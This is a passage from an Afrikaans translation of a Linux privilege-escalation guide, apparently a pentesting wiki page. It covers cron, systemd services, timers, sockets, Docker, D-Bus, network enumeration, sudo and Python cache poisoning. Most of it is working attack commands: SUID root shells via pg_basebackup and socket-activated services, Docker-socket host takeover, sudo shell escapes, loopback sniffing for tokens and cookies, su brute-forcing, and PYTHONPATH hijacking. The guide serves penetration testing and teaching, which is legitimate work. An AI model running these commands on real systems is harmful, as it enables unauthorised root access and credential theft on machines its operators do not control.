for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Jy kan ook** [**pspy**](https://github.com/DominicBreuker/pspy/releases) gebruik (dit sal elke proses wat begin monitor en lys).

### Root-backups wat aanvallerbepaalde modusbits behou (pg_basebackup)

As ’n cron-taak wat deur root besit word `pg_basebackup` (of enige rekursiewe kopieerbewerking) uitvoer op ’n databasisgids waarheen jy kan skryf, kan jy ’n **SUID/SGID binary** plaas wat as **root:root** met dieselfde modusbits na die rugsteunuitset gekopieer sal word.<sup>[[26]](#references)</sup>

Tipiese ontdekkingsvloei (as ’n DB-gebruiker met lae voorregte):
- Gebruik `pspy` om ’n root cron-taak op te spoor wat elke minuut iets soos `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` uitvoer.
- Bevestig dat jy na die brongroepering (bv. `/var/lib/postgresql/14/main`) kan skryf en dat die bestemming (`/opt/backups/current`) ná die taak deur root besit word.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Dit werk omdat `pg_basebackup` die lêermodusbisse behou wanneer die cluster gekopieer word; wanneer dit deur root uitgevoer word, erf die bestemmingslêers **root-eienaarskap + aanvallergekose SUID/SGID**. Enige soortgelyke bevoorregte rugsteun-/kopieerroetine wat toestemmings behou en na ’n uitvoerbare ligging skryf, is kwesbaar.

### Onsigbare cron jobs

Dit is moontlik om ’n cronjob te skep deur **’n carriage return ná ’n opmerking te plaas** (sonder ’n newline-karakter), en die cron job sal werk. Voorbeeld (let op die carriage return-karakter):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Om hierdie soort stealth-inskrywing op te spoor, ondersoek cron-lêers met nutsprogramme wat beheerkarakters sigbaar maak:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Dienste

### Skryfbare _.service_-lêers

Kyk of jy enige `.service`-lêer kan skryf. As jy kan, **kan jy dit wysig** sodat dit jou **backdoor uitvoer wanneer** die diens **begin**, **herbegin** of **gestop** word (dalk sal jy moet wag totdat die masjien herlaai word).\
Skep byvoorbeeld jou backdoor binne die .service-lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare diensbinaries

Hou in gedagte dat as jy **skryftoestemmings het vir binaries wat deur dienste uitgevoer word**, jy dit vir backdoors kan vervang, sodat die backdoors uitgevoer word wanneer die dienste weer uitgevoer word.

### systemd PATH - Relatiewe paaie

Jy kan die PATH sien wat deur **systemd** gebruik word met:

```bash
systemctl show-environment
```

As jy vind dat jy in enige van die vouers in die pad kan **skryf**, kan jy moontlik voorregte **eskaleer**. Soek na **relatiewe paaie** wat in dienskonfigurasielêers gebruik word, soos:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Skep dan ’n **uitvoerbare lêer** met **dieselfde naam as die binêre lêer in die relatiewe pad** binne die systemd PATH-lêergids waarin jy kan skryf. Wanneer die diens gevra word om die kwesbare aksie uit te voer (**Start**, **Stop**, **Reload**), sal jou **backdoor uitgevoer word** (onbevoorregte gebruikers kan gewoonlik nie dienste begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Kom meer te wete oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd-eenheidlêers waarvan die name op `**.timer**` eindig en wat `**.service**`-lêers of gebeurtenisse beheer. **Timers** kan as alternatief vir cron gebruik word, aangesien hulle ingeboude ondersteuning vir kalendergebeurtenisse en monotone tydgebeurtenisse het, en asinkronies uitgevoer kan word.

Jy kan al die timers lys met:

```bash
systemctl list-timers --all
```

### Skryfbare timers

As jy ’n timer kan wysig, kan jy dit ’n bestaande systemd.unit laat uitvoer (soos ’n `.service` of ’n `.target`).

```bash
Unit=backdoor.service
```

In die dokumentasie kan jy lees wat die Unit is:

> Die eenheid wat geaktiveer word wanneer hierdie timer verstryk. Die argument is ’n eenheidsnaam waarvan die agtervoegsel nie ".timer" is nie. Indien dit nie gespesifiseer word nie, is die verstekwaarde ’n diens met dieselfde naam as die timer-eenheid, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die naam van die geaktiveerde eenheid en die naam van die timer-eenheid dieselfde is, behalwe vir die agtervoegsel.

Om hierdie toestemming te misbruik, moet jy dus:

- ’n systemd-eenheid (soos ’n `.service`) vind wat **’n skryfbare binary uitvoer**
- ’n systemd-eenheid vind wat **’n relatiewe pad uitvoer**, en skryftoestemmings oor die **systemd PATH** hê (om daardie uitvoerbare lêer na te boots)

**Kom meer te wete oor timers met `man systemd.timer`.**

### **Aktivering van Timer**

Om ’n timer te aktiveer, benodig jy root-regte en moet jy die volgende uitvoer:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Let daarop dat die **timer** **geaktiveer** word deur ’n simskakel daarna te skep by `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) maak **proseskommunikasie** tussen kliënt-bedienermodelle op dieselfde of verskillende masjiene moontlik. Hulle gebruik standaard Unix-beskrywerlêers vir kommunikasie tussen rekenaars en word deur `.socket`-lêers opgestel.<sup>[[14]](#references)</sup>

Sockets kan met `.socket`-lêers opgestel word.

**Kom meer te wete oor sockets met `man systemd.socket`.** Verskeie interessante parameters kan binne hierdie lêer opgestel word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies verskil, maar ’n opsomming word gebruik om **aan te dui waarna dit gaan luister** (die pad van die AF_UNIX-socketlêer, die IPv4/6- en/of poortnommer waarna geluister moet word, ens.)
- `Accept`: Neem ’n boolean-argument. As dit **true** is, word ’n **diensinstansie vir elke inkomende verbinding geskep**, en slegs die verbindingsocket word daaraan deurgegee. As dit **false** is, word al die luisterende sockets self **aan die gestarte dienseenheid deurgegee**, en slegs een dienseenheid word vir alle verbindings geskep. Hierdie waarde word geïgnoreer vir datagramsockets en FIFOs, waar een enkele dienseenheid onvoorwaardelik alle inkomende verkeer hanteer. **Die verstekwaarde is false**. Om redes van werkverrigting word dit aanbeveel om nuwe daemons net so te skryf dat hulle geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdragreëls wat onderskeidelik **voor** of **ná** die luisterende **sockets**/FIFOs **geskep** en gebind is, uitgevoer word. Die eerste token van die opdragreël moet ’n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Bykomende **opdragte** wat onderskeidelik **voor** of **ná** die luisterende **sockets**/FIFOs **gesluit** en verwyder is, uitgevoer word.
- `Service`: Spesifiseer die naam van die **dienseenheid** **wat geaktiveer moet word** wanneer **verkeer inkom**. Hierdie instelling word slegs toegelaat vir sockets met Accept=no. Dit is by verstek die diens met dieselfde naam as die socket (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Skryfbare .socket-lêers

As jy ’n **skryfbare** `.socket`-lêer vind, kan jy iets soos `ExecStartPre=/home/kali/sys/backdoor` aan die begin van die `[Socket]`-afdeling **byvoeg**, en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag totdat die masjien herbegin word.**\
_Let daarop dat die stelsel daardie socketlêerkonfigurasie moet gebruik, anders sal die backdoor nie uitgevoer word nie_

### Socket-aktivering + skryfbare eenheidspad (skep ontbrekende diens)

Nog ’n verkeerde konfigurasie met groot impak is:

- ’n socketeenheid met `Accept=no` en `Service=<name>.service`
- die verwysde dienseenheid ontbreek
- ’n aanvaller kan na `/etc/systemd/system` (of ’n ander eenheidsoekpad) skryf

In daardie geval kan die aanvaller `<name>.service` skep en dan verkeer na die socket stuur sodat systemd die nuwe diens as root laai en uitvoer.

Vinnige verloop:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Skryfbare sockets

As jy **enige skryfbare socket identifiseer** (_ons praat nou van Unix Sockets en nie van die config `.socket`-lêers nie_), kan jy **met daardie socket kommunikeer** en moontlik ’n kwesbaarheid uitbuit.

### Enumerering van Unix Sockets

```bash
netstat -a -p --unix
```

### Rou verbinding

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation-voorbeeld:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

Let daarop dat daar dalk **sockets is wat vir HTTP-versoeke luister** (_ek praat nie van .socket-lêers nie, maar van die lêers wat as unix sockets optree_). Jy kan dit hiermee nagaan:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

As die socket met 'n HTTP-versoek reageer, kan jy daarmee kommunikeer en dalk 'n kwesbaarheid uitbuit.

### Skryfbare Docker Socket

Die Docker-socket, wat dikwels by `/var/run/docker.sock` gevind word, is 'n kritieke lêer wat beveilig moet word. By verstek is dit skryfbaar deur die `root`-gebruiker en lede van die `docker`-groep. Skryftoegang tot hierdie socket kan tot Privilege Escalation lei. Hier is 'n uiteensetting van hoe dit gedoen kan word, asook alternatiewe metodes indien die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation met Docker CLI**

As jy skryftoegang tot die Docker-socket het, kan jy voorregte eskaleer met die volgende opdragte:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Hierdie opdragte laat jou toe om ’n container met rootvlaktoegang tot die gasheer se lêerstelsel te laat loop.

#### **Docker API direk gebruik**

Wanneer die Docker CLI nie beskikbaar is nie, kan die Docker-socket steeds misbruik word deur rou HTTP oor die Unix-socket te gebruik. Die betroubaarste proses is:

- skep ’n langlewende helper-container met die gasheer se root-gids as bind-mounted
- begin dit
- skep ’n `exec`-instansie binne daardie helper
- begin die `exec`-instansie en lees die uitvoer deur die API terug

**Lys Docker-beelde**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Skep en begin ’n helper-houer**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Skep ’n exec-instansie**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Begin die exec-instansie en lees die uitvoer**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Hierdie patroon is gewoonlik meer robuust as om `attach` handmatig met `socat` of `nc -U` te probeer beheer. Sodra jy ’n helper met `/:/host` kan skep, kan jy addisionele `exec`-instansies gebruik om lêers soos `/host/root/...` te lees, SSH-sleutels onder `/host/root/.ssh` by te voeg, of opstartlêers op die host te wysig.

### Ander

Let daarop dat as jy skryftoestemmings op die docker-sokkel het omdat jy **binne die `docker`-groep** is, daar [**meer maniere is om voorregte te eskaleer**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). As die [**docker API op ’n poort luister**, kan jy dit ook kompromitteer](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **meer maniere om uit containers te ontsnap of container-runtimes te misbruik om voorregte te eskaleer** by:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy vind dat jy die **`ctr`**-opdrag kan gebruik, lees die volgende bladsy, aangesien **jy dit moontlik kan misbruik om voorregte te eskaleer**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy vind dat jy die **`runc`**-opdrag kan gebruik, lees die volgende bladsy, aangesien **jy dit moontlik kan misbruik om voorregte te eskaleer**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is ’n gesofistikeerde **interproseskommunikasiestelsel (IPC)** wat toepassings in staat stel om doeltreffend met mekaar te kommunikeer en data te deel. Dit is ontwerp met die moderne Linux-stelsel in gedagte en bied ’n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.<sup>[[16]](#references)</sup>

Die stelsel is veelsydig en ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, soortgelyk aan **verbeterde UNIX-domeinsokke**. Dit help ook om gebeure of seine uit te saai, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, ’n sein van ’n Bluetooth-daemon oor ’n inkomende oproep kan ’n musiekspeler laat stilmaak en sodoende die gebruikerservaring verbeter. Daarbenewens ondersteun D-Bus ’n afstandobjekstelsel wat diensversoeke en metode-aanroepe tussen toepassings vereenvoudig en prosesse stroomlyn wat tradisioneel kompleks was.

D-Bus werk volgens ’n **allow/deny-model** wat boodskaptoestemmings (metode-aanroepe, seinuitsendings, ens.) bestuur op grond van die gekombineerde uitwerking van beleidreëls wat ooreenstem. Hierdie beleide spesifiseer interaksies met die bus en kan moontlik voorregte-eskalasie deur die uitbuiting van hierdie toestemmings moontlik maak.

’n Voorbeeld van so ’n beleid in `/etc/dbus-1/system.d/wpa_supplicant.conf` word verskaf. Dit beskryf die toestemmings waarmee die root-gebruiker boodskappe van `fi.w1.wpa_supplicant1` kan besit, stuur en ontvang.

Beleide waar geen gebruiker of groep gespesifiseer word nie, geld universeel, terwyl "default"-konteksbeleide geld vir alles wat nie deur ander spesifieke beleide gedek word nie.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Leer hier hoe om 'n D-Bus-kommunikasie te enumerate en te exploit:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te enumerate en uit te vind waar die masjien geleë is.

### Generiese enumerasie

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

As ’n aktiewe `/etc/inetd.conf`-inskrywing GNU Inetutils `telnetd` as root laat loop, gaan die gekonfigureerde weergawe van die binêre lêer en die plaaslike listener na, selfs wanneer die poort slegs aan loopback gebind is. GNU Inetutils 1.9.3 tot en met 2.7 het ’n [telnet-authentiseringsomseiling](https://seclists.org/oss-sec/2026/q1/89) gehad waar `USER` wat deur die kliënt verskaf is, by `login -f` uitgekom het (CVE-2026-24061). ’n Proses of weergawestring is ’n aanduiding; bevestig die status van die verskaffer se pleister en die werklike daemon voordat jy dit as blootgestel beskou. Die [Telnet-gids](../../../network-services-pentesting/pentesting-telnet.md) bevat meer besonderhede.

### Vinnige triage van uitgaande filtering

As die host opdragte kan uitvoer, maar callbacks misluk, onderskei vinnig tussen DNS-, transport-, proxy- en route-filtering:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Oop poorte

Kontroleer altyd netwerkdienste wat op die masjien loop waarmee jy nie kon kommunikeer voordat jy toegang daartoe verkry het nie:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Klassifiseer luisterdienste volgens bindteiken:

- `0.0.0.0` / `[::]`: blootgestel op alle plaaslike koppelvlakke.
- `127.0.0.1` / `::1`: slegs plaaslik (goeie kandidate vir tunnel/forward).
- Spesifieke interne IP's (bv. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): gewoonlik slegs vanaf interne segmente bereikbaar.

### Werkvloei vir triage van slegs-plaaslike dienste

Wanneer jy 'n host compromise, word dienste wat aan `127.0.0.1` gebind is dikwels vir die eerste keer vanaf jou shell bereikbaar. 'n Vinnige plaaslike werkvloei is:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS as 'n netwerkskandeerder (slegs-netwerk-modus)

Benewens plaaslike PE-kontroles kan linPEAS as 'n gefokusde netwerkskandeerder loop. Dit gebruik beskikbare binaries in `$PATH` (gewoonlik `fping`, `ping`, `nc`, `ncat`) en installeer geen nutsprogramme nie.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

As jy `-d`, `-p` of `-i` sonder `-t` gebruik, tree linPEAS op as ’n suiwer netwerkskandeerder (en slaan die res van die privilege-escalation-kontroles oor).

### Sniffing

Kyk of jy verkeer kan sniff. As jy kan, kan jy moontlik sekere credentials bekom.

```
timeout 1 tcpdump
```

Vinnige praktiese kontroles:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) is besonder waardevol tydens post-exploitation omdat baie dienste wat slegs intern beskikbaar is, tokens/cookies/credentials daar blootlê:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Vang nou op, ontleed later:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Gebruikers

### Algemene Enumerasie

Kontroleer **wie** jy is, watter **voorregte** jy het, watter **gebruikers** op die stelsels is, wie kan **aanmeld** en wie **root-voorregte** het:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Groot UID

Sommige Linux-weergawes is deur ’n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om voorregte te eskaleer. Meer inligting: [hier](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hier](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) en [hier](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Gebruik die exploit** met: **`systemd-run -t /bin/bash`**

### Groepe

Kyk of jy **lid is van ’n groep** wat jou root-regte kan gee:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Klembord

Kyk of daar iets interessants in die klembord is (indien moontlik)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Wagwoordbeleid

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bekende wagwoorde

As jy **enige wagwoord** van die omgewing **ken, probeer om met die wagwoord as elke gebruiker aan te meld**.

### Su Brute

As jy nie omgee om baie geraas te maak nie, en die `su`- en `timeout`-binaries op die rekenaar teenwoordig is, kan jy probeer om gebruikers te brute-force met [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) probeer ook om gebruikers te brute-force wanneer die `-a`-parameter gebruik word.

## Misbruik van skryfbare PATH

### $PATH

As jy vind dat jy **binne ’n vouer in die $PATH kan skryf**, kan jy dalk voorregte eskaleer deur **’n backdoor in die skryfbare vouer te skep** met die naam van ’n opdrag wat deur ’n ander gebruiker (verkieslik root) uitgevoer gaan word, en wat **nie gelaai word vanaf ’n vouer wat vroeër as jou skryfbare vouer in $PATH voorkom nie**.

### SUDO en SUID

Jy kan toegelaat word om sekere opdragte met sudo uit te voer, of hulle kan die suid-bit hê. Gaan dit so na:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Sommige **onverwagte opdragte laat jou toe om lêers te lees en/of te skryf, of selfs ’n opdrag uit te voer**.<sup>[[8]](#references)</sup> Byvoorbeeld:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo-konfigurasie kan ’n gebruiker toelaat om sekere opdragte met ’n ander gebruiker se voorregte uit te voer sonder om die wagwoord te ken.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In hierdie voorbeeld kan die gebruiker `demo` `vim` as `root` uitvoer. Dit is nou eenvoudig om ’n shell te kry deur ’n ssh-sleutel by die root-gids te voeg of `sh` aan te roep.

```
sudo vim -c '!sh'
```

### Ongekwoteerde Bash-vergelyking in ’n sudo-skrip

In Bash is die regterkant van `[[ "$protected" == $candidate ]]` ’n patroon. As ’n sudo-skrip met root-vermoë `candidate` invul vanuit ’n lêer waaroor die oproeper beheer het, kan ’n waarde soos `prefix*` met die begin van ’n beskermde string ooreenstem. Verskillende sukses- en foutpaaie kan dan ’n prefix-orakel blootlê. Kwoteer die regterkant (`[[ "$protected" == "$candidate" ]]`) wanneer letterlike gelykheid bedoel word. Hersien die werklike sudo-argumente, die oorsprong van die invoer en die waarneembare vertakkingsgedrag voordat ’n ongekwoteerde vergelyking as uitbuitbaar beskou word. Die [GNU Bash-handleiding](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) beskryf hierdie patroongedrag.

### PrusaSlicer-projeklêers onder sudo

’n Onbeperkte sudo-toekenning met root-vermoë vir `prusaslicer` of `prusa-slicer` moet hersien word as die oproeper kan kies watter `.3mf`-projek gesny word. ’n Projek kan ’n naverwerkingskrip bevat wat uitgevoer word wanneer G-code uitgevoer word; spesiaal saamgestelde projekte kon tot en met weergawe 2.6.1 opdragte in PrusaSlicer uitvoer ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Bevestig die effektiewe sudo-reël, die binêre weergawe en verskafferpleisters, die projek se oorsprong, en of die betrokke uitvoerpad loop voordat jy besluit of die voorreggrens bereik kan word. ’n Vaste projekargument of ’n effektiewe `NOEXEC`-beleid kan die uitkoms verander. Die blote teenwoordigheid van die snyprogrammatuur bewys nie dat daar ’n voorregverhogingspad is nie.

### SETENV

Hierdie direktief laat die gebruiker toe om **’n omgewingsveranderlike in te stel** terwyl iets uitgevoer word:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Hierdie voorbeeld, **gebaseer op HTB-masjien Admirer**, was **kwesbaar** vir **PYTHONPATH hijacking** om ’n arbitrêre Python-biblioteek te laai terwyl die script as root uitgevoer word:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Vergiftiging van skryfbare `__pycache__` / `.pyc` in sudo-toegelate Python-imports

As ’n **sudo-toegelate Python-script** ’n module invoer waarvan die pakketgids ’n **skryfbare `__pycache__`** bevat, kan jy dalk die gecachede `.pyc` vervang en kode as die bevoorregte gebruiker uitvoer met die volgende invoer.<sup>[[30]](#references)</sup>

- Waarom dit werk:
  - CPython stoor bytecode-kas in `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Die interpreter valideer die **kopskrif** (magic + tydstempel-/hash-metadata wat aan die bron gekoppel is), en voer dan die gemarshaliseerde kodeobjek uit wat ná dié kopskrif gestoor is.
  - As jy die gecachede lêer kan **skrap en herskep** omdat die gids skryfbaar is, kan ’n root-besitte maar nie-skryfbare `.pyc` steeds vervang word.
- Tipiese pad:
  - `sudo -l` wys ’n Python-script of wrapper wat jy as root kan uitvoer.
  - Dié script voer ’n plaaslike module in vanaf `/opt/app/`, `/usr/local/lib/...`, ens.
  - Die ingevoerde module se `__pycache__`-gids is skryfbaar vir jou gebruiker of vir almal.

Vinnige enumerasie:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

As jy die bevoorregte script kan inspekteer, identifiseer die ingevoerde modules en hul kaspad:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Misbruik-werkvloei:

1. Voer die script wat deur sudo toegelaat word een keer uit sodat Python die geldige cache-lêer skep as dit nog nie bestaan nie.
2. Lees die eerste 16 grepe van die geldige `.pyc` en hergebruik dit in die vergiftigde lêer.
3. Stel ’n payload-kodeobjek saam, gebruik `marshal.dumps(...)` daarop, verwyder die oorspronklike cache-lêer en skep dit weer met die oorspronklike kopskrif plus jou kwaadwillige bytecode.
4. Voer die script wat deur sudo toegelaat word weer uit sodat die import jou payload as root uitvoer.

Belangrike notas:

- Die hergebruik van die oorspronklike kopskrif is noodsaaklik omdat Python die cache-metadata teen die bronlêer nagaan, nie of die bytecode-liggaam werklik met die bron ooreenstem nie.
